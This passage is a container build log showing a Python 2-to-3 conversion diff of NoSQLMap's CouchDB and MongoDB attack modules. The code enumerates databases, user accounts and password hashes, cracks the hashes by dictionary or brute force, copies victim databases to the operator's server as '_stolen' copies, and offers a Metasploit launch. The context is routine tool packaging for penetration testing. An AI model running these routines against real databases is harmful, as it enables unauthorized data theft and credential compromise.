+#8 6.399              requestHeaders = build_request_headers(reqHeadersIn)
+#8 6.399  
+#8 6.399          elif select == "x":
+#8 6.399 @@ -534,8 +534,8 @@
+#8 6.399      return parser
+#8 6.399  
+#8 6.399  def signal_handler(signal, frame):
+#8 6.399 -    print "\n"
+#8 6.399 -    print "CTRL+C detected.  Exiting."
+#8 6.399 +    print("\n")
+#8 6.399 +    print("CTRL+C detected.  Exiting.")
+#8 6.399      sys.exit()
+#8 6.399  
+#8 6.399  if __name__ == '__main__':
+#8 6.399 --- /opt/NoSQLMap/nsmcouch.py	(original)
+#8 6.399 +++ /opt/NoSQLMap/nsmcouch.py	(refactored)
+#8 6.399 @@ -4,7 +4,7 @@
+#8 6.399  
+#8 6.399  from exception import NoSQLMapException
+#8 6.399  import couchdb
+#8 6.399 -import urllib
+#8 6.399 +import urllib.request, urllib.parse, urllib.error
+#8 6.399  import requests
+#8 6.399  import sys
+#8 6.399  import unittest
+#8 6.399 @@ -67,80 +67,80 @@
+#8 6.399              return [3,None]
+#8 6.399  
+#8 6.399  def netAttacks(target,port, myIP, args = None):
+#8 6.399 -    print "DB Access attacks (CouchDB)"
+#8 6.399 -    print "======================"
+#8 6.399 +    print("DB Access attacks (CouchDB)")
+#8 6.399 +    print("======================")
+#8 6.399      mgtOpen = False
+#8 6.399      webOpen = False
+#8 6.399      mgtSelect = True
+#8 6.399      # This is a global for future use with other modules; may change
+#8 6.399      dbList = []
+#8 6.399 -    print "Checking to see if credentials are needed..."
+#8 6.399 +    print("Checking to see if credentials are needed...")
+#8 6.399      needCreds = couchScan(target,port,False)
+#8 6.399  
+#8 6.399      if needCreds[0] == 0:
+#8 6.399          conn = couchdb.Server("http://" + str(target) + ":" + str(port) + "/")
+#8 6.399 -        print "Successful access with no credentials!"
+#8 6.399 +        print("Successful access with no credentials!")
+#8 6.399          mgtOpen = True
+#8 6.399  
+#8 6.399      elif needCreds[0] == 1:
+#8 6.399 -            print "Login required!"
+#8 6.399 -            srvUser = raw_input("Enter server username: ")
+#8 6.399 -            srvPass = raw_input("Enter server password: ")
+#8 6.399 +            print("Login required!")
+#8 6.399 +            srvUser = input("Enter server username: ")
+#8 6.399 +            srvPass = input("Enter server password: ")
+#8 6.399              uri = "http://" + srvUser + ":" + srvPass + "@" + target + ":" + str(port) + "/"
+#8 6.399  
+#8 6.399              try:
+#8 6.399                  conn = couchdb.Server(uri)
+#8 6.399 -                print "CouchDB authenticated on " + target + ":" + str(port)
+#8 6.399 +                print("CouchDB authenticated on " + target + ":" + str(port))
+#8 6.399                  mgtOpen = True
+#8 6.399  
+#8 6.399              except NoSQLMapException:
+#8 6.399 -                raw_input("Failed to authenticate.  Press enter to continue...")
+#8 6.399 +                input("Failed to authenticate.  Press enter to continue...")
+#8 6.399                  return
+#8 6.399  
+#8 6.399      elif needCreds[0] == 2:
+#8 6.399          conn = couchdb.Server("http://" + str(target) + ":" + str(port) + "/")
+#8 6.399 -        print "Access check failure.  Testing will continue but will be unreliable."
+#8 6.399 +        print("Access check failure.  Testing will continue but will be unreliable.")
+#8 6.399          mgtOpen = True
+#8 6.399  
+#8 6.399      elif needCreds[0] == 3:
+#8 6.399 -        raw_input ("Couldn't connect to CouchDB server.  Press enter to return to the main menu.")
+#8 6.399 +        input ("Couldn't connect to CouchDB server.  Press enter to return to the main menu.")
+#8 6.399          return
+#8 6.399  
+#8 6.399  
+#8 6.399      mgtUrl = "http://" + target + ":" + str(port) + "/_utils"
+#8 6.399      # Future rev:  Add web management interface parsing
+#8 6.399      try:
+#8 6.399 -        mgtRespCode = urllib.urlopen(mgtUrl).getcode()
+#8 6.399 +        mgtRespCode = urllib.request.urlopen(mgtUrl).getcode()
+#8 6.399          if mgtRespCode == 200:
+#8 6.399 -            print "Sofa web management open at " + mgtUrl + ".  No authentication required!"
+#8 6.399 +            print("Sofa web management open at " + mgtUrl + ".  No authentication required!")
+#8 6.399  
+#8 6.399      except NoSQLMapException:
+#8 6.399 -        print "Sofa web management closed or requires authentication."
+#8 6.399 +        print("Sofa web management closed or requires authentication.")
+#8 6.399  
+#8 6.399      if mgtOpen == True:
+#8 6.399          while mgtSelect:
+#8 6.399 -            print "\n"
+#8 6.399 -            print "1-Get Server Version and Platform"
+#8 6.399 -            print "2-Enumerate Databases/Users/Password Hashes"
+#8 6.399 -            print "3-Check for Attachments (still under development)"
+#8 6.399 -            print "4-Clone a Database"
+#8 6.399 -            print "5-Return to Main Menu"
+#8 6.399 -            attack = raw_input("Select an attack: ")
+#8 6.399 +            print("\n")
+#8 6.399 +            print("1-Get Server Version and Platform")
+#8 6.399 +            print("2-Enumerate Databases/Users/Password Hashes")
+#8 6.399 +            print("3-Check for Attachments (still under development)")
+#8 6.399 +            print("4-Clone a Database")
+#8 6.399 +            print("5-Return to Main Menu")
+#8 6.399 +            attack = input("Select an attack: ")
+#8 6.399  
+#8 6.399              if attack == "1":
+#8 6.399 -                print "\n"
+#8 6.399 +                print("\n")
+#8 6.399                  getPlatInfo(conn,target)
+#8 6.399  
+#8 6.399              if attack == "2":
+#8 6.399 -                print "\n"
+#8 6.399 +                print("\n")
+#8 6.399                  enumDbs(conn,target,port)
+#8 6.399  
+#8 6.399              if attack == "3":
+#8 6.399 -                print "\n"
+#8 6.399 +                print("\n")
+#8 6.399                  enumAtt(conn,target,port)
+#8 6.399  
+#8 6.399              if attack == "4":
+#8 6.399 -                    print "\n"
+#8 6.399 +                    print("\n")
+#8 6.399                      stealDBs(myIP,conn,target,port)
+#8 6.399  
+#8 6.399              if attack == "5":
+#8 6.399 @@ -148,14 +148,14 @@
+#8 6.399  
+#8 6.399  
+#8 6.399  def getPlatInfo(couchConn, target):
+#8 6.399 -    print "Server Info:"
+#8 6.399 -    print "CouchDB Version: " + couchConn.version()
+#8 6.399 +    print("Server Info:")
+#8 6.399 +    print("CouchDB Version: " + couchConn.version())
+#8 6.399      return
+#8 6.399  
+#8 6.399  
+#8 6.399  def enumAtt(conn, target, port):
+#8 6.399      dbList = []
+#8 6.399 -    print "Enumerating all attachments..."
+#8 6.399 +    print("Enumerating all attachments...")
+#8 6.399  
+#8 6.399      for db in conn:
+#8 6.399          dbList.append(db)
+#8 6.399 @@ -176,12 +176,12 @@
+#8 6.399                   dbList.append(db)
+#8 6.399  
+#8 6.399  
+#8 6.399 -            print "List of databases:"
+#8 6.399 -            print "\n".join(dbList)
+#8 6.399 -            print "\n"
+#8 6.399 +            print("List of databases:")
+#8 6.399 +            print("\n".join(dbList))
+#8 6.399 +            print("\n")
+#8 6.399  
+#8 6.399      except NoSQLMapException:
+#8 6.399 -            print "Error:  Couldn't list databases.  The provided credentials may not have rights."
+#8 6.399 +            print("Error:  Couldn't list databases.  The provided credentials may not have rights.")
+#8 6.399  
+#8 6.399      if '_users' in dbList:
+#8 6.399          r = requests.get("http://" + target + ":" + str(port) + "/_users/_all_docs?startkey=\"org.couchdb.user\"&include_docs=true")
+#8 6.399 @@ -198,15 +198,15 @@
+#8 6.399                  userHashes.append(userDict["rows"][counter]["doc"]["derived_key"])
+#8 6.399                  userSalts.append(userDict["rows"][counter]["doc"]["salt"])
+#8 6.399  
+#8 6.399 -        print "Database Users and Password Hashes:"
+#8 6.399 +        print("Database Users and Password Hashes:")
+#8 6.399  
+#8 6.399          for x in range(0,len(userNames)):
+#8 6.399 -            print "Username: " + userNames[x]
+#8 6.399 -            print "Hash: " + userHashes[x]
+#8 6.399 -            print "Salt: "+ userSalts[x]
+#8 6.399 -            print "\n"
+#8 6.399 -
+#8 6.399 -            crack = raw_input("Crack this hash (y/n)? ")
+#8 6.399 +            print("Username: " + userNames[x])
+#8 6.399 +            print("Hash: " + userHashes[x])
+#8 6.399 +            print("Salt: "+ userSalts[x])
+#8 6.399 +            print("\n")
+#8 6.399 +
+#8 6.399 +            crack = input("Crack this hash (y/n)? ")
+#8 6.399  
+#8 6.399              if crack in yes_tag:
+#8 6.399                  passCrack(userNames[x],userHashes[x],userSalts[x],couchConn.version())
+#8 6.399 @@ -224,18 +224,18 @@
+#8 6.399          dbList.append(db)
+#8 6.399  
+#8 6.399      if len(dbList) == 0:
+#8 6.399 -        print "Can't get a list of databases to steal.  The provided credentials may not have rights."
+#8 6.399 +        print("Can't get a list of databases to steal.  The provided credentials may not have rights.")
+#8 6.399          return
+#8 6.399  
+#8 6.399      for dbName in dbList:
+#8 6.399 -        print str(menuItem) + "-" + dbName
+#8 6.399 +        print(str(menuItem) + "-" + dbName)
+#8 6.399          menuItem += 1
+#8 6.399  
+#8 6.399      while dbLoot:
+#8 6.399 -        dbLoot = raw_input("Select a database to steal:")
+#8 6.399 +        dbLoot = input("Select a database to steal:")
+#8 6.399  
+#8 6.399          if int(dbLoot) > menuItem:
+#8 6.399 -            print "Invalid selection."
+#8 6.399 +            print("Invalid selection.")
+#8 6.399  
+#8 6.399          else:
+#8 6.399              break
+#8 6.399 @@ -246,7 +246,7 @@
+#8 6.399          targetDB = myServer.create(dbList[int(dbLoot)-1] + "_stolen")
+#8 6.399          couchConn.replicate(dbList[int(dbLoot)-1],"http://" + myDB + ":5984/" + dbList[int(dbLoot)-1] + "_stolen")
+#8 6.399  
+#8 6.399 -        cloneAnother = raw_input("Database cloned.  Copy another (y/n)? ")
+#8 6.399 +        cloneAnother = input("Database cloned.  Copy another (y/n)? ")
+#8 6.399  
+#8 6.399          if cloneAnother in yes_tag:
+#8 6.399              stealDBs(myDB,couchConn,target,port)
+#8 6.399 @@ -255,19 +255,19 @@
+#8 6.399              return
+#8 6.399  
+#8 6.399      except NoSQLMapException:
+#8 6.399 -        raw_input ("Something went wrong.  Are you sure your CouchDB is running and options are set? Press enter to return...")
+#8 6.399 +        input ("Something went wrong.  Are you sure your CouchDB is running and options are set? Press enter to return...")
+#8 6.399          return
+#8 6.399  
+#8 6.399  
+#8 6.399  def passCrack (user, encPass, salt, dbVer):
+#8 6.399      select = True
+#8 6.399 -    print "Select password cracking method: "
+#8 6.399 -    print "1-Dictionary Attack"
+#8 6.399 -    print "2-Brute Force"
+#8 6.399 -    print "3-Exit"
+#8 6.399 +    print("Select password cracking method: ")
+#8 6.399 +    print("1-Dictionary Attack")
+#8 6.399 +    print("2-Brute Force")
+#8 6.399 +    print("3-Exit")
+#8 6.399  
+#8 6.399      while select:
+#8 6.399 -            select = raw_input("Selection: ")
+#8 6.399 +            select = input("Selection: ")
+#8 6.399  
+#8 6.399              if select == "1":
+#8 6.399                  select = False
+#8 6.399 @@ -288,15 +288,15 @@
+#8 6.399  
+#8 6.399  def brute_pass(hashVal,salt,dbVer):
+#8 6.399      charSel = True
+#8 6.399 -    print "\n"
+#8 6.399 -    maxLen = raw_input("Enter the maximum password length to attempt: ")
+#8 6.399 -    print "1-Lower case letters"
+#8 6.427 -    print "2-Upper case letters"
+#8 6.427 -    print "3-Upper + lower case letters"
+#8 6.427 -    print "4-Numbers only"
+#8 6.427 -    print "5-Alphanumeric (upper and lower case)"
+#8 6.427 -    print "6-Alphanumeric + special characters"
+#8 6.427 -    charSel = raw_input("\nSelect character set to use:")
+#8 6.427 +    print("\n")
+#8 6.427 +    maxLen = input("Enter the maximum password length to attempt: ")
+#8 6.427 +    print("1-Lower case letters")
+#8 6.427 +    print("2-Upper case letters")
+#8 6.427 +    print("3-Upper + lower case letters")
+#8 6.427 +    print("4-Numbers only")
+#8 6.427 +    print("5-Alphanumeric (upper and lower case)")
+#8 6.427 +    print("6-Alphanumeric + special characters")
+#8 6.427 +    charSel = input("\nSelect character set to use:")
+#8 6.427  
+#8 6.427      if charSel == "1":
+#8 6.427          chainSet = string.ascii_lowercase
+#8 6.427 @@ -317,10 +317,10 @@
+#8 6.427          chainSet = string.ascii_letters + string.digits + "!@#$%^&*()-_+={}[]|~`':;<>,.?/"
+#8 6.427  
+#8 6.427      count = 0
+#8 6.427 -    print "\n",
+#8 6.427 +    print("\n", end=' ')
+#8 6.427  
+#8 6.427      for attempt in genBrute (chainSet,int(maxLen)):
+#8 6.427 -        print "\rCombinations tested: " + str(count) + "\r"
+#8 6.427 +        print("\rCombinations tested: " + str(count) + "\r")
+#8 6.427          count += 1
+#8 6.427  
+#8 6.427          # CouchDB hashing method changed starting with v1.3.  Decide based on DB version which hash method to use.
+#8 6.427 @@ -337,7 +337,7 @@
+#8 6.427      loadCheck = False
+#8 6.427  
+#8 6.427      while loadCheck == False:
+#8 6.427 -        dictionary = raw_input("Enter path to password dictionary: ")
+#8 6.427 +        dictionary = input("Enter path to password dictionary: ")
+#8 6.427  
+#8 6.427          try:
+#8 6.427              with open (dictionary) as f:
+#8 6.427 @@ -345,9 +345,9 @@
+#8 6.427                  loadCheck = True
+#8 6.427  
+#8 6.427          except NoSQLMapException:
+#8 6.427 -            print " Couldn't load file."
+#8 6.427 -
+#8 6.427 -    print "Running dictionary attack..."
+#8 6.427 +            print(" Couldn't load file.")
+#8 6.427 +
+#8 6.427 +    print("Running dictionary attack...")
+#8 6.427  
+#8 6.427      for passGuess in passList:
+#8 6.427          temp = passGuess.split("\n")[0]
+#8 6.427 @@ -366,7 +366,7 @@
+#8 6.427  
+#8 6.427  def gen_pass_couch(passw, salt, hashVal):
+#8 6.427      if sha1(passw+salt).hexdigest() == hashVal:
+#8 6.427 -        print "Password Cracked - "+passw
+#8 6.427 +        print("Password Cracked - "+passw)
+#8 6.427          return True
+#8 6.427  
+#8 6.427      else:
+#8 6.427 @@ -377,7 +377,7 @@
+#8 6.427  	result=PBKDF2(passw,salt,iterations).read(20)
+#8 6.427  	expected=a2b_hex(hashVal)
+#8 6.427  	if result==expected:
+#8 6.427 -		print "Password Cracked- "+passw
+#8 6.427 +		print("Password Cracked- "+passw)
+#8 6.427  		return True
+#8 6.427  	else:
+#8 6.427  		return False
+#8 6.427 --- /opt/NoSQLMap/nsmmongo.py	(original)
+#8 6.427 +++ /opt/NoSQLMap/nsmmongo.py	(refactored)
+#8 6.427 @@ -4,7 +4,7 @@
+#8 6.427  
+#8 6.427  from exception import NoSQLMapException
+#8 6.427  import pymongo
+#8 6.427 -import urllib
+#8 6.427 +import urllib.request, urllib.parse, urllib.error
+#8 6.427  import json
+#8 6.427  import gridfs
+#8 6.427  import itertools
+#8 6.427 @@ -23,8 +23,8 @@
+#8 6.427      return []
+#8 6.427  
+#8 6.427  def netAttacks(target, dbPort, myIP, myPort, args = None):
+#8 6.427 -    print "DB Access attacks (MongoDB)"
+#8 6.427 -    print "================="
+#8 6.427 +    print("DB Access attacks (MongoDB)")
+#8 6.427 +    print("=================")
+#8 6.427      mgtOpen = False
+#8 6.427      webOpen = False
+#8 6.427      mgtSelect = True
+#8 6.427 @@ -32,35 +32,35 @@
+#8 6.427      global dbList
+#8 6.427      dbList = []
+#8 6.427  
+#8 6.427 -    print "Checking to see if credentials are needed..."
+#8 6.427 +    print("Checking to see if credentials are needed...")
+#8 6.427      needCreds = mongoScan(target,dbPort,False)
+#8 6.427  
+#8 6.427      if needCreds[0] == 0:
+#8 6.427          conn = pymongo.MongoClient(target,dbPort)
+#8 6.427 -        print "Successful access with no credentials!"
+#8 6.427 +        print("Successful access with no credentials!")
+#8 6.427          mgtOpen = True
+#8 6.427  
+#8 6.427      elif needCreds[0] == 1:
+#8 6.427 -        print "Login required!"
+#8 6.427 -        srvUser = raw_input("Enter server username: ")
+#8 6.427 -        srvPass = raw_input("Enter server password: ")
+#8 6.427 +        print("Login required!")
+#8 6.427 +        srvUser = input("Enter server username: ")
+#8 6.427 +        srvPass = input("Enter server password: ")
+#8 6.427          uri = "mongodb://" + srvUser + ":" + srvPass + "@" + target +"/"
+#8 6.427  
+#8 6.427          try:
+#8 6.427              conn = pymongo.MongoClient(target)
+#8 6.427 -            print "MongoDB authenticated on " + target + ":27017!"
+#8 6.427 +            print("MongoDB authenticated on " + target + ":27017!")
+#8 6.427              mgtOpen = True
+#8 6.427          except NoSQLMapException:
+#8 6.427 -            raw_input("Failed to authenticate.  Press enter to continue...")
+#8 6.427 +            input("Failed to authenticate.  Press enter to continue...")
+#8 6.427              return
+#8 6.427  
+#8 6.427      elif needCreds[0] == 2:
+#8 6.427          conn = pymongo.MongoClient(target,dbPort)
+#8 6.427 -        print "Access check failure.  Testing will continue but will be unreliable."
+#8 6.427 +        print("Access check failure.  Testing will continue but will be unreliable.")
+#8 6.427          mgtOpen = True
+#8 6.427  
+#8 6.427      elif needCreds[0] == 3:
+#8 6.427 -        print "Couldn't connect to Mongo server."
+#8 6.427 +        print("Couldn't connect to Mongo server.")
+#8 6.427          return
+#8 6.427  
+#8 6.427  
+#8 6.427 @@ -68,66 +68,66 @@
+#8 6.427      # Future rev:  Add web management interface parsing
+#8 6.427  
+#8 6.427      try:
+#8 6.427 -        mgtRespCode = urllib.urlopen(mgtUrl).getcode()
+#8 6.427 +        mgtRespCode = urllib.request.urlopen(mgtUrl).getcode()
+#8 6.427          if mgtRespCode == 200:
+#8 6.427 -            print "MongoDB web management open at " + mgtUrl + ".  No authentication required!"
+#8 6.427 -            testRest = raw_input("Start tests for REST Interface (y/n)? ")
+#8 6.427 +            print("MongoDB web management open at " + mgtUrl + ".  No authentication required!")
+#8 6.427 +            testRest = input("Start tests for REST Interface (y/n)? ")
+#8 6.427  
+#8 6.427          if testRest in yes_tag:
+#8 6.427              restUrl = mgtUrl + "/listDatabases?text=1"
+#8 6.427 -            restResp = urllib.urlopen(restUrl).read()
+#8 6.427 +            restResp = urllib.request.urlopen(restUrl).read()
+#8 6.427              restOn = restResp.find('REST is not enabled.')
+#8 6.427  
+#8 6.427              if restOn == -1:
+#8 6.427 -                print "REST interface enabled!"
+#8 6.427 +                print("REST interface enabled!")
+#8 6.427                  dbs = json.loads(restResp)
+#8 6.427                  menuItem = 1
+#8 6.427 -                print "List of databases from REST API:"
+#8 6.427 +                print("List of databases from REST API:")
+#8 6.427  
+#8 6.427                  for x in range(0,len(dbs['databases'])):
+#8 6.427                      dbTemp= dbs['databases'][x]['name']
+#8 6.427 -                    print str(menuItem) + "-" + dbTemp
+#8 6.427 +                    print(str(menuItem) + "-" + dbTemp)
+#8 6.427                      menuItem += 1
+#8 6.427              else:
+#8 6.427 -                print "REST interface not enabled."
+#8 6.427 -            print "\n"
+#8 6.427 +                print("REST interface not enabled.")
+#8 6.427 +            print("\n")
+#8 6.427  
+#8 6.427      except NoSQLMapException:
+#8 6.427 -        print "MongoDB web management closed or requires authentication."
+#8 6.427 +        print("MongoDB web management closed or requires authentication.")
+#8 6.427  
+#8 6.427      if mgtOpen == True:
+#8 6.427  
+#8 6.427          while mgtSelect:
+#8 6.427 -            print "\n"
+#8 6.427 -            print "1-Get Server Version and Platform"
+#8 6.427 -            print "2-Enumerate Databases/Collections/Users"
+#8 6.427 -            print "3-Check for GridFS"
+#8 6.427 -            print "4-Clone a Database"
+#8 6.427 -            print "5-Launch Metasploit Exploit for Mongo < 2.2.4"
+#8 6.427 -            print "6-Return to Main Menu"
+#8 6.427 -            attack = raw_input("Select an attack: ")
+#8 6.427 +            print("\n")
+#8 6.427 +            print("1-Get Server Version and Platform")
+#8 6.427 +            print("2-Enumerate Databases/Collections/Users")
+#8 6.427 +            print("3-Check for GridFS")
+#8 6.427 +            print("4-Clone a Database")
+#8 6.427 +            print("5-Launch Metasploit Exploit for Mongo < 2.2.4")
+#8 6.427 +            print("6-Return to Main Menu")
+#8 6.427 +            attack = input("Select an attack: ")
+#8 6.427  
+#8 6.427              if attack == "1":
+#8 6.427 -                print "\n"
+#8 6.427 +                print("\n")
+#8 6.427                  getPlatInfo(conn)
+#8 6.427  
+#8 6.427              if attack == "2":
+#8 6.427 -                print "\n"
+#8 6.427 +                print("\n")
+#8 6.427                  enumDbs(conn)
+#8 6.427  
+#8 6.427              if attack == "3":
+#8 6.427 -                print "\n"
+#8 6.427 +                print("\n")
+#8 6.427                  enumGrid(conn)
+#8 6.427  
+#8 6.427              if attack == "4":
+#8 6.427                  if myIP == "Not Set":
+#8 6.427 -                    print "Target database not set!"
+#8 6.427 +                    print("Target database not set!")
+#8 6.427                  else:
+#8 6.427 -                    print "\n"
+#8 6.427 +                    print("\n")
+#8 6.427                      stealDBs(myIP,target,conn)
+#8 6.427  
+#8 6.427              if attack == "5":
+#8 6.427 -                print "\n"
+#8 6.427 +                print("\n")
+#8 6.427                  msfLaunch()
+#8 6.427  
+#8 6.427              if attack == "6":
+#8 6.427 @@ -140,40 +140,40 @@
+#8 6.427      menuItem = 1
+#8 6.427  
+#8 6.427      if len(dbList) == 0:
+#8 6.427 -        print "Can't get a list of databases to steal.  The provided credentials may not have rights."
+#8 6.427 +        print("Can't get a list of databases to steal.  The provided credentials may not have rights.")
+#8 6.427          return
+#8 6.427  
+#8 6.427      for dbName in dbList:
+#8 6.427 -        print str(menuItem) + "-" + dbName
+#8 6.427 +        print(str(menuItem) + "-" + dbName)
+#8 6.427          menuItem += 1
+#8 6.427  
+#8 6.427      while dbLoot:
+#8 6.427 -        dbLoot = raw_input("Select a database to steal: ")
+#8 6.427 +        dbLoot = input("Select a database to steal: ")
+#8 6.427  
+#8 6.427          if int(dbLoot) >= menuItem:
+#8 6.427 -            print "Invalid selection."
+#8 6.427 +            print("Invalid selection.")
+#8 6.427  
+#8 6.427          else:
+#8 6.427              break
+#8 6.427  
+#8 6.427      try:
+#8 6.427          # Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
+#8 6.427 -        dbNeedCreds = raw_input("Does this database require credentials (y/n)? ")
+#8 6.427 +        dbNeedCreds = input("Does this database require credentials (y/n)? ")
+#8 6.427          myDBConn = pymongo.MongoClient(myDB, 27017)
+#8 6.427          if dbNeedCreds in no_tag:
+#8 6.427  
+#8 6.427              myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)
+#8 6.427  
+#8 6.427          elif dbNeedCreds in yes_tag:
+#8 6.427 -            dbUser = raw_input("Enter database username: ")
+#8 6.427 -            dbPass = raw_input("Enter database password: ")
+#8 6.427 +            dbUser = input("Enter database username: ")
+#8 6.427 +            dbPass = input("Enter database password: ")
+#8 6.427              myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim,dbUser,dbPass)
+#8 6.427  
+#8 6.427          else:
+#8 6.427 -            raw_input("Invalid Selection.  Press enter to continue.")
+#8 6.427 +            input("Invalid Selection.  Press enter to continue.")
+#8 6.427              stealDBs(myDB,victim,mongoConn)
+#8 6.427  
+#8 6.427 -        cloneAnother = raw_input("Database cloned.  Copy another (y/n)? ")
+#8 6.427 +        cloneAnother = input("Database cloned.  Copy another (y/n)? ")
+#8 6.427  
+#8 6.427          if cloneAnother in yes_tag:
+#8 6.427              stealDBs(myDB,victim,mongoConn)
+#8 6.427 @@ -181,27 +181,27 @@
+#8 6.427          else:
+#8 6.427              return
+#8 6.427  
+#8 6.427 -    except NoSQLMapException, e:
+#8 6.427 +    except NoSQLMapException as e:
+#8 6.427          if str(e).find('text search not enabled') != -1:
+#8 6.427 -            raw_input("Database copied, but text indexing was not enabled on the target.  Indexes not moved.  Press enter to return...")
+#8 6.427 +            input("Database copied, but text indexing was not enabled on the target.  Indexes not moved.  Press enter to return...")
+#8 6.427              return
+#8 6.427          elif str(e).find('Network is unreachable') != -1:
+#8 6.427 -            raw_input("Are you sure your network is unreachable? Press enter to return..")
+#8 6.427 +            input("Are you sure your network is unreachable? Press enter to return..")
+#8 6.427          else:
+#8 6.427 -            raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
+#8 6.427 +            input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
+#8 6.427              return
+#8 6.427  
+#8 6.427  
+#8 6.427  def passCrack (user, encPass):
+#8 6.427      select = True
+#8 6.427 -    print "Select password cracking method: "
+#8 6.427 -    print "1-Dictionary Attack"
+#8 6.427 -    print "2-Brute Force"
+#8 6.427 -    print "3-Exit"
+#8 6.427 +    print("Select password cracking method: ")
+#8 6.427 +    print("1-Dictionary Attack")
+#8 6.427 +    print("2-Brute Force")
+#8 6.427 +    print("3-Exit")
+#8 6.427  
+#8 6.427  
+#8 6.427      while select:
+#8 6.427 -        select = raw_input("Selection: ")
+#8 6.427 +        select = input("Selection: ")
+#8 6.427          if select == "1":
+#8 6.427              select = False
+#8 6.427              dict_pass(user,encPass)
+#8 6.427 @@ -217,7 +217,7 @@
+#8 6.427  
+#8 6.427  def gen_pass(user, passw, hashVal):
+#8 6.427      if md5(user + ":mongo:" + str(passw)).hexdigest() == hashVal:
+#8 6.427 -        print "Found - " + user + ":" + passw
+#8 6.427 +        print("Found - " + user + ":" + passw)
+#8 6.427          return True
+#8 6.427      else:
+#8 6.427          return False
+#8 6.427 @@ -227,15 +227,15 @@
+#8 6.427      loadCheck = False
+#8 6.427  
+#8 6.427      while loadCheck == False:
+#8 6.427 -        dictionary = raw_input("Enter path to password dictionary: ")
+#8 6.427 +        dictionary = input("Enter path to password dictionary: ")
+#8 6.427          try:
+#8 6.427              with open (dictionary) as f:
+#8 6.427                     passList = f.readlines()
+#8 6.427              loadCheck = True
+#8 6.427          except NoSQLMapException:
+#8 6.427 -            print " Couldn't load file."
+#8 6.427 -
+#8 6.427 -    print "Running dictionary attack..."
+#8 6.427 +            print(" Couldn't load file.")
+#8 6.427 +
+#8 6.427 +    print("Running dictionary attack...")
+#8 6.427      for passGuess in passList:
+#8 6.427          temp = passGuess.split("\n")[0]
+#8 6.427          gotIt = gen_pass (user, temp, key)
+#8 6.427 @@ -251,15 +251,15 @@
+#8 6.427  
+#8 6.427  def brute_pass(user,key):
+#8 6.427      charSel = True
+#8 6.427 -    print "\n"
+#8 6.427 -    maxLen = raw_input("Enter the maximum password length to attempt: ")
+#8 6.427 -    print "1-Lower case letters"
+#8 6.427 -    print "2-Upper case letters"
+#8 6.427 -    print "3-Upper + lower case letters"
+#8 6.427 -    print "4-Numbers only"
+#8 6.427 -    print "5-Alphanumeric (upper and lower case)"
+#8 6.427 -    print "6-Alphanumeric + special characters"
+#8 6.427 -    charSel = raw_input("\nSelect character set to use:")
+#8 6.427 +    print("\n")
+#8 6.427 +    maxLen = input("Enter the maximum password length to attempt: ")
+#8 6.427 +    print("1-Lower case letters")
+#8 6.427 +    print("2-Upper case letters")
+#8 6.427 +    print("3-Upper + lower case letters")
+#8 6.427 +    print("4-Numbers only")
+#8 6.427 +    print("5-Alphanumeric (upper and lower case)")
+#8 6.427 +    print("6-Alphanumeric + special characters")
+#8 6.427 +    charSel = input("\nSelect character set to use:")
+#8 6.427  
+#8 6.427      if charSel == "1":
+#8 6.427          chainSet = string.ascii_lowercase
+#8 6.427 @@ -279,61 +279,61 @@
+#8 6.427      elif charSel == "6":
+#8 6.427          chainSet = string.ascii_letters + string.digits + "!@#$%^&*()-_+={}[]|~`':;<>,.?/"
+#8 6.427      count = 0
+#8 6.427 -    print "\n",
+#8 6.427 +    print("\n", end=' ')
+#8 6.427      for attempt in genBrute (chainSet,int(maxLen)):
+#8 6.427 -        print "\rCombinations tested: " + str(count) + "\r"
+#8 6.427 +        print("\rCombinations tested: " + str(count) + "\r")
+#8 6.427          count += 1
+#8 6.427          if md5(user + ":mongo:" + str(attempt)).hexdigest() == key:
+#8 6.427 -            print "\nFound - " + user + ":" + attempt
+#8 6.427 +            print("\nFound - " + user + ":" + attempt)
+#8 6.427              break
+#8 6.427      return
+#8 6.427  
+#8 6.427  
+#8 6.427  def getPlatInfo (mongoConn):
+#8 6.427 -    print "Server Info:"
+#8 6.427 -    print "MongoDB Version: " + mongoConn.server_info()['version']
+#8 6.427 -    print "Debugs enabled : " + str(mongoConn.server_info()['debug'])
+#8 6.427 -    print "Platform: " + str(mongoConn.server_info()['bits']) + " bit"
+#8 6.427 -    print "\n"
+#8 6.427 +    print("Server Info:")
+#8 6.427 +    print("MongoDB Version: " + mongoConn.server_info()['version'])
+#8 6.427 +    print("Debugs enabled : " + str(mongoConn.server_info()['debug']))
+#8 6.427 +    print("Platform: " + str(mongoConn.server_info()['bits']) + " bit")
+#8 6.427 +    print("\n")
+#8 6.427      return
+#8 6.427  
+#8 6.427  
+#8 6.427  def enumDbs (mongoConn):
+#8 6.427      try:
+#8 6.427 -        print "List of databases:"
+#8 6.427 -        print "\n".join(mongoConn.database_names())
+#8 6.427 -        print "\n"
+#8 6.427 +        print("List of databases:")
+#8 6.427 +        print("\n".join(mongoConn.database_names()))
+#8 6.427 +        print("\n")
+#8 6.427  
+#8 6.427      except NoSQLMapException:
+#8 6.427 -        print "Error:  Couldn't list databases.  The provided credentials may not have rights."
+#8 6.427 -
+#8 6.427 -    print "List of collections:"
+#8 6.427 +        print("Error:  Couldn't list databases.  The provided credentials may not have rights.")
+#8 6.427 +
+#8 6.427 +    print("List of collections:")
+#8 6.427  
+#8 6.427      try:
+#8 6.427          for dbItem in mongoConn.database_names():
+#8 6.427              db = mongoConn[dbItem]
+#8 6.427 -            print dbItem + ":"
+#8 6.427 -            print "\n".join(db.collection_names())
+#8 6.427 -            print "\n"
+#8 6.427 +            print(dbItem + ":")
+#8 6.427 +            print("\n".join(db.collection_names()))
+#8 6.427 +            print("\n")
+#8 6.427  
+#8 6.427              if 'system.users' in db.collection_names():
+#8 6.427                  users = list(db.system.users.find())
+#8 6.427 -                print "Database Users and Password Hashes:"
+#8 6.427 +                print("Database Users and Password Hashes:")
+#8 6.427  
+#8 6.427                  for x in range (0,len(users)):
+#8 6.427 -                    print "Username: " + users[x]['user']
+#8 6.427 -                    print "Hash: " + users[x]['pwd']
+#8 6.427 -                    print "\n"
+#8 6.427 -                    crack = raw_input("Crack this hash (y/n)? ")
+#8 6.427 +                    print("Username: " + users[x]['user'])
+#8 6.427 +                    print("Hash: " + users[x]['pwd'])
+#8 6.427 +                    print("\n")
